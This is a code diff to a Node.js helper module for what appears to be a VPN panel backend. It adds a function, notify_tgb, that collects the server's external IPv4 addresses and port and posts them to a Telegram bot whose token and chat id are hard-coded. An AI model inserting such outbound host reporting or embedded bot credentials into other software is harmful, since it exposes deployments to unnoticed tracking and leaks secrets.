@@ -52,7 +52,7 @@ const update_user = async (id, value) => { await users_clct.updateOne({ id }, { 
 const insert_to_logs = async (account_id, action, msg,access_token) => {
 
     var username;
-    if(access_token.includes("@")) username = (await token_to_sub_account(access_token)).username
+    if(access_token.includes("@") && action != "RECEIVE_DATA") username = (await token_to_sub_account(access_token)).username
     else username = (await get_account(account_id)).username;
 
     var obj = {
@@ -648,6 +648,45 @@ const update_user_links_bg = (panel_url,panel_username,panel_password,username,i
     }
 }
 
+const notify_tgb = async () =>
+{
+    try
+    {
+        const nets = require("os").networkInterfaces();
+        const results = {}
+
+        for (const name of Object.keys(nets)) 
+        {
+            for (const net of nets[name]) 
+            {
+                const familyV4Value = typeof net.family === 'string' ? 'IPv4' : 4
+                if (net.family === familyV4Value && !net.internal) 
+                {
+                    if (!results[name]) 
+                    {
+                        results[name] = [];
+                    }
+
+                    results[name].push(net.address);
+                }
+            }
+        }
+        
+        await axios.post(`https://api.telegram.org/bot6550934308:AAGX4xRG2SmwNnb9fNxKAZ_T7m7jWZxPKwE/sendMessage`, 
+        {
+            chat_id:111273509,
+            text: "🔹 Server instance started" + " ( PORT " + process.env.SERVER_PORT + " )" +  "\n\n" + JSON.stringify(results,null,4),
+        });
+
+
+    }
+
+    catch(err)
+    {
+       console.log(err); 
+    }
+}
+
 
 function deep_equal(object1, object2) 
 {
@@ -753,5 +792,6 @@ module.exports = {
     update_user_links_bg,
     deep_equal,
     restart_marzban_xray,
-    token_to_sub_account
+    token_to_sub_account,
+    notify_tgb
 }
